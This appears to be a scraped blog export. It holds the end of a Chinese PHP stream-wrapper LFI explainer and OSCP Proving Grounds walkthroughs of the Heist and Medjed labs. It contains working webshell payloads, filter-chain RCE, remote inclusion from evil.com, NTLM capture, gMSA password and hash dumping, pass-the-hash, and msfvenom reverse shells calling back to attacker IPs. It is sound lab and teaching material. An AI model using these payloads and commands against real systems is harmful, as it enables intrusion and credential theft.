用于从FTP服务器下载或上传文件，常用于文件传输任务。 ftps:&#x2F;&#x2F; FTP的加密版本，使用SSL&#x2F;TLS保护数据传输。 用于安全地传输文件到FTP服务器，适用于需要加密的场景。 php:&#x2F;&#x2F; 特殊的I&#x2F;O流包装器，用于访问PHP进程的输入输出流或临时内存。 提供对标准输入输出、请求体、内存流的访问，常用于处理自定义输入输出或调试。 data:&#x2F;&#x2F; 允许直接嵌入数据到URI中，通常以Base64编码形式存储。 用于将小型数据（如图片或脚本）嵌入代码中，避免外部文件依赖，常用于测试或简单数据传递。 zip:&#x2F;&#x2F; 访问ZIP压缩文件内的内容，需提供ZIP文件路径和内部文件路径。 用于读取或操作ZIP文件中的内容，如解压特定文件，常用于处理压缩包。 phar:&#x2F;&#x2F; 访问PHP归档文件（Phar）中的内容，类似于ZIP但专为PHP设计。 用于运行或访问Phar打包的PHP应用，常用于分发PHP库或应用程序。 glob:&#x2F;&#x2F; 使用通配符模式匹配文件系统中的文件或目录。 用于批量处理文件，如查找所有.txt文件，常用于文件管理任务。 compress.zlib:&#x2F;&#x2F; 处理使用zlib（gzip）压缩的文件或流，支持读写操作。 用于解压或压缩文件，常用于处理.gz文件或节省存储空间。 compress.bzip2:&#x2F;&#x2F; 处理使用bzip2压缩的文件或流，支持读写操作。 用于解压或压缩文件，常用于处理.bz2文件，提供更高的压缩率。 ssh2:&#x2F;&#x2F; 通过SSH2协议访问远程服务器的文件系统或执行命令（需SSH2扩展）。 用于通过SSH安全地操作远程文件或执行命令，常用于服务器管理。 ogg:&#x2F;&#x2F; 处理Ogg Vorbis音频流（需oggvorbis扩展）。 用于读取或处理Ogg格式音频文件，常用于音频应用开发。 php:&#x2F;&#x2F; 子包装器详解php:&#x2F;&#x2F;包装器功能丰富且用途广泛，其子类型如下： 子包装器 原理 用途 php:&#x2F;&#x2F;stdin 提供对标准输入流的只读访问，等同于常量STDIN。 用于从命令行读取用户输入，适用于CLI脚本。 php:&#x2F;&#x2F;stdout 提供对标准输出流的可写访问，等同于常量STDOUT。 用于向命令行输出数据，适用于CLI脚本。 php:&#x2F;&#x2F;stderr 提供对标准错误流的可写访问，等同于常量STDERR。 用于输出错误信息到命令行，适用于CLI脚本中的错误处理。 php:&#x2F;&#x2F;input 提供对HTTP请求原始数据的只读访问，获取请求体内容。 用于读取POST、PUT等请求的原始数据，常用于RESTful API处理。 php:&#x2F;&#x2F;output 提供对输出缓冲区的可写访问，类似echo或print。 用于直接写入输出缓冲区，常用于动态生成内容。 php:&#x2F;&#x2F;memory 在内存中创建读写流，数据始终存储在内存中。 用于临时存储数据，适合小规模数据处理，关闭后数据丢失。 php:&#x2F;&#x2F;temp 在内存中创建读写流，超出指定大小（如2MB）后转为临时文件。 用于处理较大临时数据，内存不足时自动切换到文件存储。 php:&#x2F;&#x2F;filter 元包装器，允许在打开流时应用过滤器（如编码或转换）。 用于在读取或写入时处理数据，如将文件内容转为Base64编码，常用于调试或安全检查。 在渗透测试中的利用file://如果应用程序 未对用户输入的文件路径进行过滤 ，攻击者可以使用 file:// 访问服务器上的任意可读文件。 12echo file_get_contents(&quot;file:///etc/passwd&quot;);echo file_get_contents(&quot;file://C:/Windows/system.ini&quot;); php://filter在 file:// 不可用或被WAF过滤时可以利用编码方式读取敏感信息 base64读取php源码 123echo file_get_contents(&quot;php://filter/convert.base64-encode/resource=config.php&quot;);echo &quot;base64_encoded_string&quot; | base64 -d filter chain结合LFI实现RCE github: https://github.com/synacktiv/php_filter_chain_generator php_filter_chain_generator.py 利用PHP过滤器的可组合性，通过精心设计的过滤器组合，将攻击者提供的PHP代码（如 &lt;?php system(&#39;id&#39;); ?&gt;）转换为可在目标上下文中执行的形式，具体来说是利用不同编码和转码之间的差异，在php中这种差异导致的错误会被忽略，从而生成了不符预期的字符 我们可以在python源码中看到作者构建好的字母和数字的filter chain 123456789conversions = &#123; ... &#x27;9&#x27;: &#x27;convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB&#x27;, &#x27;A&#x27;: &#x27;convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213&#x27;, &#x27;a&#x27;: &#x27;convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE&#x27;, &#x27;B&#x27;: &#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000&#x27;, &#x27;b&#x27;: &#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE&#x27;, .... 即便是没有可写入路径的情况下也可以通过 php://temp来利用。 细节请阅读：PHP filters chain: What is it and how to use it 示例：利用filters chain向日志文件中注入恶意代码，然后利用LFI执行 1234python3 php_filter_chain_generator.py --chain &#x27;&lt;?php system(&quot;id&quot;); ?&gt;&#x27;[+] The following gadget chain will generate the following code : &lt;?php system(&quot;id&quot;); ?&gt; (base64 value: PD9waHAgc3lzdGVtKCJpZCIpOyA/Pg)php://filter/convert.iconv.UTF8.CSISO2022KR|c...de/resource=/var/log/apache2/access.log 1234# Testers should make sure to change the $URL, $FILTERS with the chaining that generates their payload and $FILE with the path to the file they can read.curl --user-agent &quot;PENTEST&quot; &quot;$URL?parameter=php://filter/$FILTERS/resource=$FILE&quot;curl --user-agent &quot;PENTEST&quot; &quot;$URL?parameter=php://convert.base64-decode|...|resource=/var/log/apache2/access.log&quot; data://前提： allow_url_include: on data:// 允许在 URL 直接嵌入 Base64 编码的数据，并作为输入流。include() 会将 Base64 解码，并执行 PHP 代码 123456789# Shell in base64 encodingecho &quot;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot; | base64# Accessing the log file via LFIcurl --user-agent &quot;PENTEST&quot; &quot;$URL/?parameter=data://text/plain;base64,$SHELL_BASE64&amp;cmd=id&quot;例：include(&quot;data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+&quot;);decode: &lt;?php system(&#x27;id&#x27;); ?&gt; php://input前提： allow_url_include: on php://input 允许读取 HTTP 请求的 原始输入数据 。会直接解析用户传入的代码并执行 1234# Testers should make sure to change the $URLcurl --user-agent &quot;PENTEST&quot; -s -X POST --data &quot;&lt;?php system(&#x27;id&#x27;); ?&gt;&quot; &quot;$URL?parameter=php://input&quot;curl -X POST --data &quot;&lt;?php system(&#x27;id&#x27;); ?&gt;&quot; http://target.com/vuln.php expect://前提：expect extension 如果 expect:// 被启用，可以直接执行命令 123curl --user-agent &quot;PENTEST&quot; -s &quot;$URL/?parameter=expect://id&quot;echo file_get_contents(&quot;expect://ls -la&quot;); zip://前提：可以上传.zip文件 zip://会读取和执行zip中的文件，可以绕过一些检查, 可通过 include(&#39;zip://evil.zip#shell.php&#39;) 来执行恶意代码 12345echo &quot;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot; &gt; payload.phpzip payload.zip payload.php# Accessing the log file via LFI (the # identifier is URL-encoded)curl --user-agent &quot;PENTEST&quot; &quot;$URL/?parameter=zip://payload.zip%23payload.php&amp;cmd=id&quot; phpar://前提：可以上传文件 phar:// 允许访问 .phar 归档文件中的数据， 原理基本同 zip:// 12345678910111213141516&lt;?php$phar = new Phar(&#x27;shell.phar&#x27;);$phar-&gt;startBuffering();$phar-&gt;addFromString(&#x27;shell.txt&#x27;, &#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;);$phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;);$phar-&gt;stopBuffering();php --define phar.readonly=0 shell.php &amp;&amp; mv shell.phar shell.jpgcurl --user-agent &quot;PENTEST&quot; &quot;$URL/?parameter=phar://./shell.jpg%2Fshell.txt&amp;cmd=id&quot;$object = unserialize(file_get_contents(&quot;phar://evil.phar&quot;)); 如果 unserialize() 解析 phar://，也可能触发 __wakeup() 或 __destruct() 执行任意代码 1$object = unserialize(file_get_contents(&quot;phar://evil.phar&quot;)); compress.zlib://compress.zlib:// 利用原理同上 1include(&#x27;compress.zlib://shell.php.gz&#x27;) compress.bzip2://原理同上 1include(&#x27;compress.bzip2://shell.php.bz2&#x27;) ftp:// &#x2F; ftps://前提：allow_url_fopen=On ftp:// 允许 PHP 访问 FTP 服务器上的文件，攻击者可以 远程包含恶意 PHP ，触发 RCE；也可以用于 SSRF（服务器端请求伪造） ，探测内网资产 1echo file_get_contents(&quot;ftp://user:pass@evil.com/malware.php&quot;); http:// &#x2F; https://http://允许从远程服务器加载恶意资源（如PHP脚本），执行代码或伪装合法请求 1include(&#x27;http://evil.com/shell.php&#x27;) 防御手段 禁用危险Wrappers123allow_url_include=Offallow_url_fopen=Offdisable_functions=system,passthru,exec,shell_exec,popen,proc_open 使用 is_readable()验证文件路径12345if (is_readable($user_input_file)) &#123; include $user_input_file;&#125; else &#123; die(&quot;Invalid file&quot;);&#125; 严格控制 unserialize()1$data = unserialize($input, [&#x27;allowed_classes&#x27; =&gt; false]); 参考 https://www.php.net/manual/en/wrappers.php https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/php-wrappers-and-streams https://medium.com/@robsfromashes/php-wrapper-and-local-file-inclusion-2fb82c891f55 https://www.freebuf.com/articles/web/193849.html php:&#x2F;&#x2F;filter chains: https://github.com/synacktiv/php_filter_chain_generator https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html","categories":[{"name":"How It Works-临渊羡鱼","slug":"How-It-Works-临渊羡鱼","permalink":"https://www.thiiiiink.com/categories/How-It-Works-%E4%B8%B4%E6%B8%8A%E7%BE%A1%E9%B1%BC/"},{"name":"PHP","slug":"How-It-Works-临渊羡鱼/PHP","permalink":"https://www.thiiiiink.com/categories/How-It-Works-%E4%B8%B4%E6%B8%8A%E7%BE%A1%E9%B1%BC/PHP/"}],"tags":[]},{"title":"Proving Grounds Practice - Heist","date":"2025-03-03T16:41:06.000Z","path":"post/20250304004106.html","text":"DifficultyHard Scanautorecon 192.168.149.165 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758[*] domain found on tcp/53. dns domain[*] kerberos-sec found on tcp/88. kerberos-sec[*] msrpc found on tcp/135.[*] netbios-ssn found on tcp/139.[*] ldap found on tcp/389. / 3268 heist.offsec rootDomainNamingContext: DC=heist,DC=offsec| ldapServiceName: heist.offsec:dc01$@HEIST.OFFSEC[*] microsoft-ds found on tcp/445. SMB 3.0[*] kpasswd5 found on tcp/464.[*] ncacn_http found on tcp/593.[*] ms-wbt-server found on tcp/3389. commonName=DC01.heist.offsec[*] http found on tcp/8080. Server: Werkzeug/2.0.1 Python/3.9.0 ssrf http://192.168.149.165:8080/?url=http://localhost:8080[*] tcpwrapped found on tcp/636.[*] tcpwrapped found on tcp/3269.[*] wsman found on tcp/5985. WinRM[*] mc-nmf found on tcp/9389.[*] msrpc found on tcp/49666.[*] msrpc found on tcp/49667.[*] ncacn_http found on tcp/49673.[*] msrpc found on tcp/49674.[*] msrpc found on tcp/49677[*] msrpc found on tcp/49704.[*] msrpc found on tcp/49786.[*] domain found on udp/53.[*] kerberos-sec found on udp/88.[*] ntp found on udp/123. domain dig首先添加heist.offsec和dc1.heist.offsec到 &#x2F;etc&#x2F;hosts中， 123456dig @192.168.149.165 AXFR heist.offsec; &lt;&lt;&gt;&gt; DiG 9.20.2-1-Debian &lt;&lt;&gt;&gt; @192.168.149.165 AXFR heist.offsec; (1 server found);; global options: +cmd; Transfer failed. rpcclient12rpcclient 192.168.149.165 -NCannot connect to server. Error was NT_STATUS_LOGON_FAILURE smbclient123smbclient -L //192.168.149.165 -Nsession setup failed: NT_STATUS_ACCESS_DENIED ldapsearch12345678910111213141516ldapsearch -H ldap://192.168.149.165 -x -b &quot;DC=offsec,DC=heist&quot; |tee ldap_dump# extended LDIF## LDAPv3# base &lt;DC=offsec,DC=heist&gt; with scope subtree# filter: (objectclass=*)# requesting: ALL## search resultsearch: 2result: 1 Operations errortext: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera tion a successful bind must be completed on the connection., data 0, v4563# numResponses: 1 8080whatweb123whatweb -a 3 http://192.168.149.165:8080http://192.168.149.165:8080 [200 OK] Bootstrap[3.3.6], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.0.1 Python/3.9.0], IP[192.168.149.165], JQuery[2.2.2], Python[3.9.0], Script, Title[Super Secure Web Browser], Werkzeug[2.0.1] gobuster12345678910111213141516171819gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://192.168.149.165:8080 -t 40===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.149.165:8080[+] Method: GET[+] Threads: 40[+] Wordlist: /usr/share/wordlists/dirb/big.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.6[+] Timeout: 10s===============================================================Starting gobuster in directory enumeration mode===============================================================Progress: 20469 / 20470 (100.00%)===============================================================Finished=============================================================== ssrf vuln访问 http://192.168.149.165:8080/页面如下，只有一个输入框，提示输入一个url, 输入 http://192.168.149.165:8080/ 还是同一个页面，确定是ssrf漏洞. FootholdResponder截止目前我们还没有得到任何和用户相关的信息，如果可以窃取到NTLMV2 hash的话，就有了突破口，接下来使用 responder窃取handshake时的hash kali启动responser, 输入框内输入kali的80端口地址 http://192.168.45.165/， 获取到了 NTLM V2 hash 1234567891011121314151617181920212223242526272829303132333435363738sudo responder -I tun0 -wv[sudo] password for kali: __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| NBT-NS, LLMNR &amp; MDNS Responder 3.1.5.0 To support this project: Github -&gt; https://github.com/sponsors/lgandx Paypal -&gt; https://paypal.me/PythonResponder Author: Laurent Gaffie (laurent.gaffie@gmail.com) To kill this script hit CTRL-C[+] Poisoners: LLMNR [ON] NBT-NS [ON] MDNS [ON] DNS [ON] DHCP [OFF][+] Servers: HTTP server [ON] HTTPS server [ON]....[+] Listening for events...[!] Error starting TCP server on port 3389, check permissions or other servers running.[HTTP] Sending NTLM authentication request to 192.168.149.165[HTTP] GET request from: ::ffff:192.168.149.165 URL: / [HTTP] NTLMv2 Client : 192.168.149.165[HTTP] NTLMv2 Username : HEIST\\enox[HTTP] NTLMv2 Hash : enox::HEIST:c22b3ec3fb2f既然有了hash,接下来就是破解了 hashcat -m 5600 enox.hash /usr/share/wordlist/rockyou.txt, 得到密码 enox:california 接下来使用密码通过3389登录rdp, 登录失败 12345678xfreerdp +clipboard /u:enox /p:california /v:192.168.149.165 /d:heist.offsec[00:07:24:582] [2881148:2881151] [WARN][com.freerdp.crypto] - Certificate verification failure &#x27;self-signed certificate (18)&#x27; at stack position 0[00:07:24:582] [2881148:2881151] [WARN][com.freerdp.crypto] - CN = DC01.heist.offsec[00:07:24:200] [2881148:2881151] [ERROR][com.freerdp.core.transport] - BIO_read returned a system error 104: Connection reset by peer[00:07:24:200] [2881148:2881151] [ERROR][com.freerdp.core] - transport_read_layer:freerdp_set_last_error_ex ERRCONNECT_CONNECT_TRANSPORT_FAILED [0x0002000D][00:07:26:808] [2881148:2881151] [ERROR][com.freerdp.core.transport] - BIO_read returned a system error 104: Connection reset by peer[00:07:26:808] [2881148:2881151] [ERROR][com.freerdp.core] - transport_read_layer:freerdp_set_last_error_ex ERRCONNECT_CONNECT_TRANSPORT_FAILED [0x0002000D][00:07:26:808] [2881148:2881151] [ERROR][com.freerdp.core] - freerdp_post_connect failed 登录smb,没有得到什么有用信息 12345678910111213141516171819202122232425262728293031323334353637383940smbclient -L //192.168.149.165 -U enoxPassword for [WORKGROUP\\enox]: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share SYSVOL Disk Logon server share Reconnecting with SMB1 for workgroup listing.do_connect: Connection to 192.168.149.165 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)Unable to connect with SMB1 -- no workgroup available smbclient //192.168.149.165/netlogon -U enoxPassword for [WORKGROUP\\enox]:Try &quot;help&quot; to get a list of possible commands.smb: \\&gt; ls . D 0 Tue Jul 20 19:01:21 2021 .. D 0 Tue Jul 20 19:01:21 2021 7706623 blocks of size 4096. 3249419 blocks availablesmb: \\&gt; exit smbclient //192.168.149.165/sysvol -U enoxPassword for [WORKGROUP\\enox]:Try &quot;help&quot; to get a list of possible commands.smb: \\&gt; ls . D 0 Tue Jul 20 19:01:21 2021 .. D 0 Tue Jul 20 19:01:21 2021 heist.offsec Dr 0 Tue Jul 20 19:01:21 2021 7706623 blocks of size 4096. 3249419 blocks availablesmb: \\&gt; cd heist.offsecsmb: \\heist.offsec\\&gt; ls . D 0 Tue Jul 20 19:07:47 2021 .. D 0 Tue Jul 20 19:07:47 2021 DfsrPrivate DHSr 0 Tue Jul 20 19:07:47 2021 Policies D 0 Tue Jul 20 19:01:30 2021 scripts D 0 Tue Jul 20 19:01:21 2021 evil-winrm 登录成功 1234567891011evil-winrm -i 192.168.149.165 -u enox -p california Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\enox\\Documents&gt; ls*Evil-WinRM* PS C:\\Users\\enox\\Documents&gt; cd .. Escalation在enox&#x2F;desktop文件夹下发现todo.txt 然后在&#x2F;users 目录下发现有svc_apache$用户，可能是一个利用点 常规收集enox用户权限、运行进程、serivce都没有收货，运行winpeas一样没有得到提权有用的信息。不过既然是AD，就要上传SharpHound.ps1收集一下域相关信息 bloodhound1234567*Evil-WinRM* PS C:\\users\\enox&gt; . .\\sharphound.ps1*Evil-WinRM* PS C:\\users\\enox&gt; invoke-bloodhound -collectionmethod all -outputprefix &quot;audit&quot; -outputdirectory &quot;/users/enox&quot;*Evil-WinRM* PS C:\\Users\\enox&gt; download audit_20250303064734_BloodHound.zip Info: Downloading C:\\Users\\enox\\audit_20250303064734_BloodHound.zip to audit_20250303064734_BloodHound.zip Info: Download successful! ReadGMSAPasswordBloodHound 中看到enox用户所属WEB ADMINS有对SVC_APACH$有ReadGMSAPassword权限 “ReadGMSAPassword”通常指的是一种权限或能力，允许某个账户读取Active Directory中组管理服务账户（gMSA）的密码。gMSA是Windows Server 2012引入的一种特殊服务账户类型，用于自动化密码管理，广泛应用于域环境中的服务和应用程序。 gMSA的特点： 密码由域控制器（DC）自动生成和管理（240字节随机密码）。 默认每30天自动轮换一次（可配置）。 允许多台主机使用同一账户运行服务，解决了传统MSA（Managed Service Account）只能绑定单机的限制。 密码存储在AD对象的 msDS-ManagedPassword 属性中。 ReadGMSAPassword 的含义： 在AD中，gMSA的密码访问权限由 msDS-GroupMSAMembership 属性控制，该属性定义了哪些安全主体（用户、组或计算机）可以读取密码。 如果一个账户拥有“ReadGMSAPassword”权限（通常表现为 RIGHT_DS_READ_PROPERTY 访问控制权限），它可以提取gMSA的当前密码。 那么接下来就是获取svc_apache$的密码信息了 测试bloodhound中给出的gMSADumper.py, 执行后只是列出来who can read， 这些是我们已经知道的了。 1234567python gMSADumper.py -u enox -p california -d heist.offsecUnable to start a TLS connection. Is LDAPS enabled? Only ACLs will be listed and not ms-DS-ManagedPassword.Users or groups who can read password for svc_apache$: &gt; DC01$ &gt; Web Admins 搜索一下 readgmsa password找到下面的链接： https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword bloodyAD： https://github.com/CravateRouge/bloodyAD 成功读取到ntlm hash:0c43e5ad6bc9104cfb94d56f4aecb4ab 123456./bloodyAD.py --host 192.168.149.165 -d heist.offsec -u enox -p california get object svc_apache$ --attr msDS-ManagedPassworddistinguishedName: CN=svc_apache,CN=Managed Service Accounts,DC=heist,DC=offsecmsDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:0c43e5ad6bc9104cfb94d56f4aecb4abmsDS-ManagedPassword.B64ENCODED: b8iUgZTAehetubX0QcQQoLkmMSjGS7MXKpta94CcZvY4hej/0kCetCW0BVRtyfpubMbV/SECcA0VvsH2dvzZjsna1RLixNOQEedehbIpHdPFmvVcgwl30oBm2/+HJ8p0ox2VYjB/bjTx3VLiInMHzriTIlFLAL/j7feKC383nDPSpyUnfza62KJFYBHcQA//XGJ9rcl33pTN1IdYeEpzOcNzmca2QRdtIbBLpDTsRceO0qafC8a1yYkDtmfC1JmZxG9T3BopaW8Xl1Jjc1hTUDr9rAtGuUCSDCrTY50hI2B9HzkMXoAzPVz0L7amoE0X4QPNtGWDrM4+fg3//AUARw== Pass The Hash查看svc_apache$权限： SeRestorePrivilege 1234567891011121314151617181920212223242526272829303132evil-winrm -i 192.168.149.165 -u &quot;svc_apache$&quot; -H &quot;0c43e5ad6bc9104cfb94d56f4aecb4ab&quot; Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\svc_apache$\\Documents&gt; ls Directory: C:\\Users\\svc_apache$\\DocumentsMode LastWriteTime Length Name---- ------------- ------ -----a---- 9/14/2021 8:27 AM 3213 EnableSeRestorePrivilege.ps1*Evil-WinRM* PS C:\\Users\\svc_apache$\\Documents&gt; whoami /privPRIVILEGES INFORMATION----------------------Privilege Name Description State============================= ============================== =======SeMachineAccountPrivilege Add workstations to domain EnabledSeRestorePrivilege Restore files and directories EnabledSeChangeNotifyPrivilege Bypass traverse checking EnabledSeIncreaseWorkingSetPrivilege Increase a process working set Enabled SeRestorPrivilege SeRestorePrivilege 是 Windows 操作系统中的一种特权（Privilege），全称是 **”Restore files and directories”**（恢复文件和目录）。它属于安全特权的一部分，通常由系统管理员或高权限账户持有，用于执行涉及系统级恢复或修改的操作。 通常授予 Administrators 组（本地管理员）。 在域环境中，可能由 Domain Admins 或特定服务账户（如备份服务）持有。 默认情况下，非管理员用户不具备此特权。 可以做什么： 绕过文件权限： 无视文件或目录的ACL，直接写入或覆盖内容。 示例：即使文件只允许“SYSTEM”写入，拥有此特权的用户也能修改它。 修改注册表： 包括受限的注册表键（如 HKEY_LOCAL_MACHINE\\SAM、HKEY_LOCAL_MACHINE\\SECURITY）。 可用于添加用户、修改权限等。 还原备份： 与备份工具（如 Windows Server Backup）配合，恢复系统文件或数据。 简而言之： 拥有修改系统文件权限 利用SeRestoreAbuse.exe执行反弹shell， 成功得到管理员shell SeRestoreAbuse:``https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.165 LPORT=443 -f exe -o r.exe 123456789101112131415161718*Evil-WinRM* PS C:\\Users\\svc_apache$&gt; upload SeRestoreAbuse.exe Info: Uploading /home/kali/Tools/pg/Heist/SeRestoreAbuse.exe to C:\\Users\\svc_apache$\\SeRestoreAbuse.exe Data: 22528 bytes of 22528 bytes copied Info: Upload successful!*Evil-WinRM* PS C:\\Users\\svc_apache$&gt; upload r.exe Info: Uploading /home/kali/Tools/pg/Heist/r.exe to C:\\Users\\svc_apache$\\r.exe Data: 9556 bytes of 9556 bytes copied Info: Upload successful!*Evil-WinRM* PS C:\\Users\\svc_apache$&gt; .\\SeRestoreAbuse.exe C:\\Users\\svc_apache$\\r.exeRegCreateKeyExA result: 0RegSetValueExA result: 0SeRestoreAbuse.exe : start-service : Service &#x27;Secondary Logon (seclogon)&#x27; cannot be started due to the following error: Cannot start 123456789rlwrap nc -nvlp 443listening on [any] 443 ...connect to [192.168.45.165] from (UNKNOWN) [192.168.149.165] 52353Microsoft Windows [Version 10.0.17763.2061](c) 2018 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&gt;whoamiwhoamint authority\\system","categories":[{"name":"What We Do-三天打鱼","slug":"What-We-Do-三天打鱼","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/"},{"name":"OSCP","slug":"What-We-Do-三天打鱼/OSCP","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/"},{"name":"PG Lab","slug":"What-We-Do-三天打鱼/OSCP/PG-Lab","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/PG-Lab/"},{"name":"Active Directory","slug":"What-We-Do-三天打鱼/OSCP/PG-Lab/Active-Directory","permalink":"https://www.thiiiiink.com/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/PG-Lab/Active-Directory/"}],"tags":[]},{"title":"Proving Grounds Practice - Medjed","date":"2025-03-02T16:12:29.000Z","path":"post/20250303001229.html","text":"DifficultyMedium Scansautorecon123456789101112131415161718192021222324252627282930313233343536373839404142434445464748[*] msrpc found on tcp/135.[*] netbios-ssn found on tcp/139.[*] microsoft-ds found on tcp/445.[*] mysql found on tcp/3306. MariaDB[*] http-alt found on tcp/8000. Server: BarracudaServer.com (Windows) + OPTIONS: WebDAV enabled (MKCOL LOCK COPY PROPPATCH PROPFIND UNLOCK listed as allowed).[*] unknown found on tcp/5040.[*] ftp found on tcp/30021. FileZilla ftpd 0.9.41 beta 可匿名登录[*] unknown found on tcp/33033. sugid[*] unknown found on tcp/44330. ssl: 8000[*] http found on tcp/45332. Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23) Quiz App http://192.168.111.127:45332/phpinfo.php Loaded Configuration File C:\\xampp\\php\\php.ini Zend Engine v3.3.23 TMP \\xampp\\tmp SQLite Library 3.28.0[*] http found on tcp/45443. Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23 seems like 45332[*] msrpc found on tcp/49664.[*] msrpc found on tcp/49665.[*] msrpc found on tcp/49666.[*] msrpc found on tcp/49667.[*] msrpc found on tcp/49668.[*] msrpc found on tcp/49669. 445 smb匿名用户无法登录 30021 ftp可以匿名登录, 看起来是一个project, 使用lft命令全部下载 lftp -e &quot;mirror -c -e / ftp&quot; ftp://192.168.111.127:30021, 但是没有找到什么有价值信息 123456789101112131415161718192021222324252627282930ftp -a -A 192.168.111.127 -p 30021Connected to 192.168.111.127.220-FileZilla Server version 0.9.41 beta220-written by Tim Kosse (Tim.Kosse@gmx.de)220 Please visit http://sourceforge.net/projects/filezilla/331 Password required for anonymous230 Logged onRemote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls229 Entering Extended Passive Mode (|||49905|)150 Connection accepted-r--r--r-- 1 ftp ftp 536 Nov 03 2020 .gitignoredrwxr-xr-x 1 ftp ftp 0 Nov 03 2020 appdrwxr-xr-x 1 ftp ftp 0 Nov 03 2020 bindrwxr-xr-x 1 ftp ftp 0 Nov 03 2020 config-r--r--r-- 1 ftp ftp 130 Nov 03 2020 config.rudrwxr-xr-x 1 ftp ftp 0 Nov 03 2020 db-r--r--r-- 1 ftp ftp 1750 Nov 03 2020 Gemfiledrwxr-xr-x 1 ftp ftp 0 Nov 03 2020 libdrwxr-xr-x 1 ftp ftp 0 Nov 03 2020 log-r--r--r-- 1 ftp ftp 66 Nov 03 2020 package.jsondrwxr-xr-x 1 ftp ftp 0 Nov 03 2020 public-r--r--r-- 1 ftp ftp 227 Nov 03 2020 Rakefile-r--r--r-- 1 ftp ftp 374 Nov 03 2020 README.mddrwxr-xr-x 1 ftp ftp 0 Nov 03 2020 testdrwxr-xr-x 1 ftp ftp 0 Nov 03 2020 tmpdrwxr-xr-x 1 ftp ftp 0 Nov 03 2020 vendor226 Transfer OKftp&gt; 8000&#x2F;44330 BarracudaServernikto -ask=no -Tuning=x4567890ac -nointeractive -host http://192.168.111.127:8000 2&gt;&amp;1结果提示webdav enabled, 可以尝试利用上传文件。 浏览器打开链接，about 页面发现版本号 BarracudaDrive 6.5 searchsploit BarracudaDrive 查看Description部分，是因为bd service 是localSystem执行的，如果可以替换bd.exe重启以后可以实现提权，很有用的信息，等下提权的时候试下。 33033发现了一些用户名，保存下来，后续可能有用，右上角login进入登录页面，登录页面有forget password按钮 输入用户名、助记词、新密码可以重置密码，试了上面的用户名和他们的slogan, 没有成功。（实际上题解的利用方式就是重置了jerren的密码，Reminder是paranoid, 是slogan中的关键词，然后利用sql注入写websell) 45332&#x2F;45443nikto发现phpinfo.php, gobuster使用的字典没有扫到 Foothold继续看下webdav, 访问 https://192.168.111.127:44330/会弹出set administraor account页面，输入admin:password, email随意。然后进入web-file-server 点击fs进入https://192.168.111.127:44330/fs/然后发现可以访问任意目录, 然后根据 45332端口的phpinfo中目录信息来到 https://192.168.111.127:44330/fs/c/xampp/htdocs/, msfvenom -p php/reverse_php LHOST=192.168.45.165 LPORT=8000 -f raw -o r.php 生成webshell上传，请求后得到webshell 12345rlwrap nc -nvlp 8000listening on [any] 8000 ...connect to [192.168.45.165] from (UNKNOWN) [192.168.111.127] 49886whoamimedjed\\jerren Escalation按照48789.txt的步骤检查bd service和bd.exe权限，完全符合，直接 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.165 LPORT=443 -f exe -o bd.exe 替换bd.exe, 然后 shutdown /r /t 0 重启，然后得到webshell 12345678910111213141516171819202122232425262728## Insecure Folder PermissionC:\\&gt;cacls C:\\bdC:\\bd BUILTIN\\Administrators:(OI)(CI)(ID)F NT AUTHORITY\\SYSTEM:(OI)(CI)(ID)F BUILTIN\\Users:(OI)(CI)(ID)R NT 